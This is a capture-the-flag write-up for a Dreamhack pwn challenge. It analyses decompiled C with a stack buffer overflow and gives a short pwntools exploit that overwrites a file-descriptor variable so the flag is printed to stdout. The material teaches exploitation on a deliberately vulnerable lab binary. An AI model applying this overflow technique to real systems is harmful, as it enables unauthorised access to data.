+++
date = '2026-05-06'
draft = false
title = 'Dreamhack awesome-basics Writeup'
ShowToc = true
tags = ["Dreamhack", "pwn"]
+++

## Challenge overview



Stack Buffer Overflow 취약점이 존재하는 프로그램입니다. 주어진 바이너리와 소스 코드를 분석하여 익스플로잇하고 플래그를 획득하세요! 플래그는 flag 파일에 있습니다.

플래그의 형식은 DH{...} 입니다.

---

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE buf[80]; // [rsp+10h] [rbp-60h] BYREF
  int v5; // [rsp+60h] [rbp-10h]
  int fd; // [rsp+64h] [rbp-Ch]
  int v7; // [rsp+68h] [rbp-8h]
  int v8; // [rsp+6Ch] [rbp-4h]

  v8 = 0;
  v7 = 1;
  initialize(argc, argv, envp);
  flag = malloc(0x45u);
  fd = open("./flag", 0);
  read(fd, flag, 0x45u);
  close(fd);
  v5 = open("./tmp/flag", 1);
  write(1, "Your Input: ", 0xCu);
  read(0, buf, 128u);
  write(v5, flag, 69u);
  write(v5, buf, 80u);
  close(v5);
  return 0;
}
```

## Identifying the vulnerabilities

This seems pretty straightforward;

First, the flag is read into `flag`, which gets malloc-ed. Then, the fd is closed.

Then, another fd is opened, to /tmp/flag. This one is write-only. We get a total buffer overflow of `buf`, meaning we can modify all the values on the stack.

After that, the program tried to `write(v5, flag, 69u);`. If we modify `v5` to become 1 (stdout), we can get the flag. So, let's get started!

I made a payload that filled `buf` and then sent a 64-bit `0x1`, and, upon sending it, we can see the local flag! Now, let's just connect remotely and we're done.

![challenge-screenshot](flag.png#center)

## The exploit

```python
from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/awesomebasics/chall')

context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:17231'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    
payload = b"A"*80 + p64(0x1) #overwrite v5 with 1 = stdout
p.recvuntil(b": ")
p.send(payload)

p.interactive()
```

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/awesomebasics.py)**.
